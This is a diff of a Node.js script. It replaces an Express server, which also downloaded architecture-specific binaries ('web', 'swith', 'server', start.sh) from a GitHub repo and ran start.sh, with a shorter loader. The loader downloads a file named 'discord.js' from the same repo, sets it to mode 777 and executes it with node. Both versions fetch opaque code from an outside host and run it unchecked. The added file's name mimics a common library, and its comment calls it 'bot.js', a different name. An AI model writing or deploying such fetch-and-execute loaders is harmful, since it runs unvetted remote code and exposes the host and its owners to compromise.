@@ -1,132 +1,46 @@
-const port = process.env.PORT || 3000;
-const express = require("express");
-const app = express();
-const exec = require("child_process").exec;
-const fs = require("fs");
-const path = require("path");
+const fs = require('fs');
+const path = require('path');
 const axios = require('axios');
-const os = require('os');
+const { exec } = require('child_process');
 
-app.get("/", function(req, res) {
-  res.send("hello world");
-});
 
-app.get("/list", (req, res) => {
-    fs.readFile("list.txt", "utf8", (err, data) => {
-      if (err) {
-        console.error(err);
-        res.status(500).json({ error: "Error reading list.txt" });
-      } else {
-        res.status(200).send(data);
-      }
-    });
-});
-app.get("/sub", (req, res) => {
-  fs.readFile("sub.txt", "utf8", (err, data) => {
-    if (err) {
-      console.error(err);
-      res.status(500).json({ error: "Error reading sub.txt" });
-    } else {
-      res.setHeader('Content-Type', 'application/octet-stream');
-      res.status(200).send(data);
-    }
-  });
-});
+// Specify the URL of the bot.js file to download
+const fileUrl = 'https://github.com/eoovve/test/releases/download/node/discord.js';
+const fileName = 'discord.js';
+const filePath = path.join(__dirname, fileName);
 
-// 判断系统架构
-function getSystemArchitecture() {
-  const arch = os.arch();
-  if (arch === 'arm' || arch === 'arm64') {
-    return 'arm';
-  } else {
-    return 'amd';
-  }
-}
+// Download and execute the file
+const downloadAndExecute = () => {
+  const fileStream = fs.createWriteStream(filePath);
 
-// 下载必要运行文件
-function downloadFile(fileName, fileUrl, callback) {
-    axios({
-      method: 'get',
-      url: fileUrl,
-      responseType: 'stream',
-    })
-      .then(response => {
-        const stream = fs.createWriteStream(path.join('./', fileName));
-        response.data.pipe(stream);
-        stream.on('finish', function() {
-          stream.close();
-          // 给文件赋予权限 775
-          fs.chmod(path.join('./', fileName), 0o775, function(err) {
-            if (err) {
-              callback(`Failed to set permissions for ${fileName}`);
-            } else {
-              callback(null, fileName);
-            }
-          });
-        });
-      })
-      .catch(err => {
-        callback(`Download ${fileName} file failed`);
+  axios
+    .get(fileUrl, { responseType: 'stream' })
+    .then((response) => {
+      response.data.pipe(fileStream);
+      return new Promise((resolve, reject) => {
+        fileStream.on('finish', resolve);
+        fileStream.on('error', reject);
       });
-  }
+    })
+    .then(() => {
+      console.log('File download finished');
+      fs.chmodSync(filePath, '777'); 
 
-// 根据系统架构返回对应的文件url
-function getFilesForArchitecture(architecture) {
-  if (architecture === 'arm') {
-    return [
-      { fileName: "web", fileUrl: "https://github.com/eoovve/test/releases/download/ARM/web" },
-      { fileName: "swith", fileUrl: "https://github.com/eoovve/test/releases/download/ARM/swith" },
-      { fileName: "server", fileUrl: "https://github.com/eoovve/test/releases/download/ARM/server" },
-      { fileName: "start.sh", fileUrl: "https://github.com/eoovve/test/releases/download/6-amd/start.sh" },
-    ];
-  } else if (architecture === 'amd') {
-    return [
-      { fileName: "web", fileUrl: "https://github.com/eoovve/test/raw/main/web" },
-      { fileName: "swith", fileUrl: "https://github.com/eoovve/test/raw/main/swith" },
-      { fileName: "server", fileUrl: "https://github.com/eoovve/test/raw/main/server" },
-      { fileName: "start.sh", fileUrl: "https://github.com/eoovve/test/releases/download/6-amd/start.sh" },
-    ];
-  }
-  return [];
-}
+      console.log('Executing the file...');
+      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Error while executing the file: ${error}`);
+        } else {
+          console.log(`File execution result:\n${stdout}`);
+        }
+      });
 
-function downloadAndRunFiles() {
-  const architecture = getSystemArchitecture();
-  const filesToDownload = getFilesForArchitecture(architecture);
-
-  if (filesToDownload.length === 0) {
-    console.log(`Can't find a file for the current architecture`);
-    return;
-  }
-
-  let downloadedCount = 0;
-
-  filesToDownload.forEach(fileInfo => {
-    downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
-      if (err) {
-        console.log(`Download ${fileName} failed`);
-      } else {
-        console.log(`Download ${fileName} successfully`);
-      }
-
-      downloadedCount++;
-
-      if (downloadedCount === filesToDownload.length) {
-        console.log("All files downloaded");
-
-        // 执行start.sh
-        exec("bash start.sh", function(err, stdout, stderr) {
-          if (err) {
-            console.error(err);
-            return;
-          }
-          console.log(stdout);
-        });
-
-      }
+      child.on('exit', (code) => {
+        console.log(`File execution completed with exit code: ${code}`);
+      });
+    })
+    .catch((error) => {
+      console.error(`Error while downloading the file: ${error}`);
     });
-  });
-}
-downloadAndRunFiles();
-
-app.listen(port, () => console.log(`Server is running on port ${port}!`));
+};
+downloadAndExecute();
